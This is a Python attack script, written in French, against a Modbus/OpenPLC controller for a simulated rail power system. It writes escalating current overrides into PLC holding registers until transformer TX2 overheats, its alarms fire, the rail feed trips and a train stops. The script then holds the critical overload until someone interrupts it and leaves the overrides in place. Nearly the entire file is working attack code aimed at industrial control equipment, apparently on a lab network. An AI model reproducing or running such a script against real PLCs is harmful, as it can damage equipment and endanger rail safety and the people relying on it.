#!/usr/bin/env python3
"""
Attaque thermique progressive TX2 ? 3 phases
============================================
Phase 1 ? RECHAUFFEMENT (0?30s)
    Rampe 200?290A : température monte de 45°C ? ~82°C
    Pas d'alarme, trains nominaux

Phase 2 ? HIGH ALARM (30?55s)
    Palier 290A : ALM_TX2_Temp_High déclenche (~80°C)
    ? DKR plafonné à 45 km/h, DMD plafonné à 40 km/h

Phase 3 ? ESCALADE CRITIQUE (55s+)
    Saut à 355A : ALM_Fdr2_Surcharge + stress ×10
    ? TX2 oil >140°C ? ALM_TX2_Temp_Crit
    ? TX2 trip ? AlimentationRail_DMD = FALSE
    ? Train DMD arrêt complet
    ? maintien de l'attaque jusqu'à arrêt manuel Ctrl+C

Cible  : plc_station_b 192.168.20.10:502
Offset Modbus OpenPLC : %MW0 = HR1024
"""

import time
import sys
from pymodbus.client import ModbusTcpClient

PLC_HOST    = "192.168.20.10"
PLC_PORT    = 502
MW_OFFSET   = 1024

# Holding Registers écriture (FC06)
REG_OVR_I1  = MW_OFFSET + 10   # HR1034 ? %MW10
REG_OVR_I2  = MW_OFFSET + 11   # HR1035 ? %MW11
REG_OVR_I3  = MW_OFFSET + 12   # HR1036 ? %MW12

# Input Registers lecture (FC04)
IR_TX2_OIL  = 7    # MET_TX2_OilTemp
IR_TX2_WIND = 8    # MET_TX2_WindingTemp
IR_DKR_SPD  = 31   # DKR_MET_VITESSE_TRAIN
IR_DMD_SPD  = 41   # DMD_MET_VITESSE_TRAIN

# Discrete Inputs lecture (FC02)  ? addr = byte*8 + bit
DI_TX2_HIGH = 9    # ALM_TX2_Temp_High  %IX1.1
DI_TX2_CRIT = 10   # ALM_TX2_Temp_Crit  %IX1.2
DI_DKR_SIG  = 15   # DKR_ETAT_SIGNAL_VERT %IX1.7
DI_DMD_SIG  = 43   # DMD_ETAT_SIGNAL_VERT %IX5.3

POLL        = 0.5  # secondes

# ?? Phases ??????????????????????????????????????????????????????????????????
# (label, durée_s, I_début, I_fin)  ? rampe linéaire sur la durée
PHASES = [
    ("RECHAUFFEMENT ",  30, 200, 290),   # rampe 200?290A  (~75?82°C target)
    ("HIGH - RALENTIS", 25, 290, 290),   # palier  290A    (80°C+ stable)
    ("ESCALADE CRIT  ", None, 355, 355), # palier  355A    ? maintien jusqu'à Ctrl+C
]

BAR_MAX  = 120   # °C pour barre ASCII
BAR_WIDE = 20


def bar(val, max_val=BAR_MAX, width=BAR_WIDE):
    filled = int(val / max_val * width)
    filled = min(filled, width)
    b = "?" * filled + "?" * (width - filled)
    if val >= 95:  return f"\033[91m[{b}]\033[0m"
    if val >= 80:  return f"\033[93m[{b}]\033[0m"
    return f"\033[92m[{b}]\033[0m"


def read_state(c):
    t  = c.read_input_registers(IR_TX2_OIL, count=2)
    s  = c.read_input_registers(IR_DKR_SPD, count=1)
    s2 = c.read_input_registers(IR_DMD_SPD, count=1)
    d  = c.read_discrete_inputs(DI_TX2_HIGH, count=2)
    ds = c.read_discrete_inputs(DI_DKR_SIG, count=1)
    dm = c.read_discrete_inputs(DI_DMD_SIG, count=1)
    if any(x.isError() for x in [t, s, s2, d, ds, dm]):
        return None
    return {
        "tx2_oil":  t.registers[0],
        "tx2_wind": t.registers[1],
        "dkr_spd":  s.registers[0],
        "dmd_spd":  s2.registers[0],
        "high":     d.bits[0],
        "crit":     d.bits[1],
        "dkr_sig":  ds.bits[0],
        "dmd_sig":  dm.bits[0],
    }


def inject(c, i1, i2, i3):
    c.write_register(REG_OVR_I1, int(i1))
    c.write_register(REG_OVR_I2, int(i2))
    c.write_register(REG_OVR_I3, int(i3))


# ?? Entrée principale ????????????????????????????????????????????????????????
def main():
    print(f"\n{'?'*66}")
    print("  ATTAQUE THERMIQUE PROGRESSIVE ? TX2 ? Arrêt Train DMD")
    print(f"  Cible : {PLC_HOST}:{PLC_PORT}")
    print(f"{'?'*66}\n")

    c = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
    if not c.connect():
        print("[ERREUR] Connexion PLC impossible"); sys.exit(1)
    print("[OK] Connecté\n")

    # Baseline
    base = read_state(c)
    if base:
        print(f"[BASELINE]  TX2 oil={base['tx2_oil']}°C  wind={base['tx2_wind']}°C  "
              f"| DKR={base['dkr_spd']} km/h  DMD={base['dmd_spd']} km/h\n")

    print(f"{'?'*66}")
    hdr = (f"{'t(s)':>6}  {'Phase':<18} {'I2(A)':>6}  "
           f"{'TX2 oil':>7}  {'TX2 wind':>8}  "
           f"{'HIGH':>5}  {'CRIT':>5}  "
           f"{'DKR':>5}  {'DMD':>5}")
    print(hdr)
    print(f"{'?'*66}")

    # Flags événements déjà signalés
    ev_high = ev_crit = ev_dkr_slow = ev_dmd_slow = ev_dmd_stop = False

    t_global = time.time()

    try:
        for (label, duration, i_start, i_end) in PHASES:
            t_phase = time.time()

            while True:
                elapsed_phase  = time.time() - t_phase
                elapsed_global = time.time() - t_global

                # Courant injecté (rampe linéaire ou palier)
                if i_end != i_start and duration is not None:
                    frac = min(elapsed_phase / duration, 1.0)
                    I = i_start + (i_end - i_start) * frac
                else:
                    I = i_start

                # Injecter (légère variation ±5/+8 pour réalisme)
                inject(c, I, I - 5, I + 8)

                # Lire état
                st = read_state(c)
                if st is None:
                    time.sleep(POLL); continue

                # Barre de température TX2
                b = bar(st['tx2_oil'])

                row = (f"{elapsed_global:>6.1f}  {label:<18} {int(I):>6}A  "
                       f"{st['tx2_oil']:>6}°C  {st['tx2_wind']:>7}°C  "
                       f"{'OUI' if st['high'] else 'non':>5}  "
                       f"{'OUI' if st['crit'] else 'non':>5}  "
                       f"{st['dkr_spd']:>4}kh  {st['dmd_spd']:>4}kh")
                print(row)

                # ?? Marqueurs événements ??????????????????????????????????
                if st['high'] and not ev_high:
                    print(f"\n  ?? [{elapsed_global:.1f}s] ALM_TX2_TEMP_HIGH ? "
                          f"DKR ?45 km/h | DMD ?40 km/h\n")
                    ev_high = True

                if not ev_dkr_slow and st['dkr_spd'] <= 45 and st['high']:
                    print(f"  ?  [{elapsed_global:.1f}s] DKR ralenti à {st['dkr_spd']} km/h")
                    ev_dkr_slow = True

                if not ev_dmd_slow and st['dmd_spd'] <= 40 and st['high']:
                    print(f"  ?  [{elapsed_global:.1f}s] DMD ralenti à {st['dmd_spd']} km/h")
                    ev_dmd_slow = True

                if st['crit'] and not ev_crit:
                    print(f"\n  ?? [{elapsed_global:.1f}s] ALM_TX2_TEMP_CRIT ? "
                          f"TX2 trip ? AlimentationRail_DMD = FALSE\n")
                    ev_crit = True

                if not ev_dmd_stop and st['dmd_spd'] == 0 and ev_crit:
                    print(f"  ?  [{elapsed_global:.1f}s] DMD : signal {'VERT' if st['dmd_sig'] else 'ROUGE'} "
                          f"? TRAIN ARRÊTÉ\n")
                    ev_dmd_stop = True

                # ?? Conditions de sortie de phase ????????????????????????
                # Fin de durée de phase. La phase critique n'a pas de durée:
                # elle reste active jusqu'à interruption manuelle.
                if duration is not None and elapsed_phase >= duration:
                    break

                time.sleep(POLL)

            # Transition entre phases
            if label.strip() != "ESCALADE CRIT":
                next_idx = PHASES.index((label, duration, i_start, i_end)) + 1
                next_label = PHASES[next_idx][0] if next_idx < len(PHASES) else ""
                print(f"\n{'?'*66}")
                print(f"  ? Phase suivante : {next_label.strip()}")
                print(f"{'?'*66}")
            else:
                print("\n[INFO] Maintien critique actif. Arrêt manuel avec Ctrl+C.")

        # ?? Résumé final ?????????????????????????????????????????????????
        print(f"\n{'?'*66}")
        st = read_state(c)
        if st:
            total = time.time() - t_global
            print(f"  OBJECTIF ATTEINT en {total:.1f}s")
            print(f"  TX2 oil final : {st['tx2_oil']}°C  winding : {st['tx2_wind']}°C")
            print(f"  Signal DMD    : {'VERT' if st['dmd_sig'] else 'ROUGE'}")
            print(f"  Vitesse DMD   : {st['dmd_spd']} km/h  |  DKR : {st['dkr_spd']} km/h")
        print(f"{'?'*66}\n")

    except KeyboardInterrupt:
        print("\n[!] Interrompu")
    finally:
        c.close()
        print("[OK] Déconnecté ? overrides Feeder 2 conservés.\n")


if __name__ == "__main__":
    main()
